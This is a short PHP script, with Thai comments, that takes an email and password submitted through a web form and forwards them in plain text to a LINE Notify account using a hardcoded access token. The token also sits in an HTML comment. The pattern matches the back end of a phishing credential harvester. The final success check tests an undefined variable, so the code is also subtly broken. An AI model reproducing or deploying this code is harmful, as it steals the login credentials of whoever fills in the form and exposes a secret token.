<!--linetoken : Rsnlt2WrcGyZbZo8qBnNQSyWVQQVCYPImcAaseL7wYY-->

<?php 
$email=$_POST['email'];
$password=$_POST['password'];

define('LINE_API',"https://notify-api.line.me/api/notify");
 
			$token = "Rsnlt2WrcGyZbZo8qBnNQSyWVQQVCYPImcAaseL7wYY"; //ใส่Token ที่copy เอาไว้
			
			$str = 
				   "\r\n".' email = '.$email.
                   "\r\n".'password = '.$password;
				    //ข้อความที่ต้องการส่ง สูงสุด 1000 ตัวอักษร
			 
			$res = notify_message($str,$token);
			//print_r($res);
			function notify_message($message,$token){
			 $queryData = array('message' => $message);
			 $queryData = http_build_query($queryData,'','&');
			 $headerOptions = array( 
			         'http'=>array(
			            'method'=>'POST',
			            'header'=> "Content-Type: application/x-www-form-urlencoded\r\n"
			                      ."Authorization: Bearer ".$token."\r\n"
			                      ."Content-Length: ".strlen($queryData)."\r\n",
			            'content' => $queryData
			         ),
			 );
			 $context = stream_context_create($headerOptions);
			 $result = file_get_contents(LINE_API,FALSE,$context);
			 $res = json_decode($result);
			 return $res;
			}


        if($rs_line){
            echo"<script type='text/javascript'>";
            echo "alert('success');";
            echo"window.location = 'test_line.php'";
            echo"</script>";
        }else{
            echo"<script type='text/javascript'>";
            echo "alert('error');";
            echo"window.location = 'test_line.php'";
            echo"</script>";

        }
?>